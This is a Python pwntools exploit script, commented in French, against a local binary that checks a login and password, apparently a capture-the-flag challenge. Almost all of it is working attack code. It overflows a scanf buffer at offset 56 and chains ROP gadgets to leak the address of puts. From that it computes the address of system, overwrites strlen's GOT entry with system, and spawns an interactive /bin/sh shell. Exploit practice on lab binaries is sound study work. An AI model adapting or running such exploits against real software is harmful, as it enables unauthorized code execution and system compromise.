# coding: utf-8

from pwn import *


p = process("./prog.bin")

header = """************************************************
** Vérification du couple login/mot de passe. **
************************************************
"""

p.recvuntil(header)


# envoie à fgets : suite de la rop chain entamée dans le scanf
payload =  p64(0)               # rbp
payload += p64(0x40086b)        # ret : pop rbp; ret
payload += p64(0x601ef8+0x14)   # rbp
payload += p64(0x400863)        # ret : mov    eax,DWORD PTR [rbp-0x14]; add rsp, 0x38; pop rbx; pop rbp; ret;
payload += "gwelgwel"*9         # bourage
payload += p64(0x4005e1)        # ret : pop rdi ; and byte ptr [rax], ah ; mov rbp, rsp; ret;
payload += p64(0x602018)        # rdi
payload += p64(0x400550)        # ret : puts.plt
payload += p64(0x40086b)        # ret : pop rbp; ret;
payload += p64(0x601ef8+0x38)   # rbp # pointer to got
payload += p64(0x40088a)        # ret : fgets


p.send(payload+"\n")

# overflow scanf : eip à l'offset 56. on ajoute un espace pour dire à scanf que la chaine est terminée
# cet espace sera lu par la prochaine fonction lisant l'entrée standard
p.send ("A"*56+"\x6b\x08\x40 ") # ret : pop rbp; ret;

p.recvuntil("[-] il n'y a pas de nombre\n")

# leak de l'addresse de puts : on en déduit l'addresse de system.
# l'offset doit être ajusté à votre libc !
system = u64(p.recvuntil("\n")[:-1]+"\x00"*2) - 0x29B10 

print ("system at %x" % system)

# on envoie une seconde fois à fgets, qui écrira le résultat sur la got
p.send("/bin/sh"+"\x00"*24+p64(system)+"\n")
# l'addresse de strlen a été écrasée par system
# après le fgets le programme appelle strlen() sur la chaine lue dans fgets ici " /bin/sh" avec l'espace, qui est ignoré par system.

p.interactive()

p.close()

